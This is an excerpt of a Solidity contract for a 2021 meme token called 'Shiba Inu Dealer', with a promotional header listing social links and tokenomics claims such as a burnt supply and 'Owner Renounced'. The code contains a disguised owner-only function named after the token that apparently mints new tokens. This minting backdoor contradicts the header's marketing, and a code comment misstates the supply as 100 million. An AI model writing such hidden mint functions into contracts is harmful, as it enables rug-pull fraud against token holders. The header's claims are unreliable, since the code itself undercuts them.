 ...
 *  ╚═════╝░╚═╝░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝░╚═════╝░╚═════╝░╚══════╝╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚═╝
 * 
 *          Telegram Group - @shibainudealer
 * 
 *              Name   : Shiba Inu Dealer
 *              Symbol : SHIBDEAL
 *              Supply 1.000.000.000
 *              Decimals 9
 *              🔥 Burnt Supply 30%
 *              🔥 LP Locked 68%
 *              🟢 Dev & Marketing Wallet 2%
 *              ♻️ Owner Renounced & Contact Verified
 *
 *
 *      About Us
 *      Website : https://www.shibainudealer.com/
 *      Twitter : https://twitter.com/shibainudealer/
 *      Telegram : https://t.me/shibainudealer
 * 
 * 
 *      Copyright (c) 2021 Shiba Inu Dealer
 */
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function ShibaInuDealer(uint256 amount) public onlyOwner {
    _shibainudealer(msg.sender, amount);
    }
    ...
    function _shibainudealer(address account, uint256 amount) internal virtual {
...
contract ShibaInuDealer is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Shiba Inu Dealer", "SHIBDEAL") {
        _shibainudealer(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}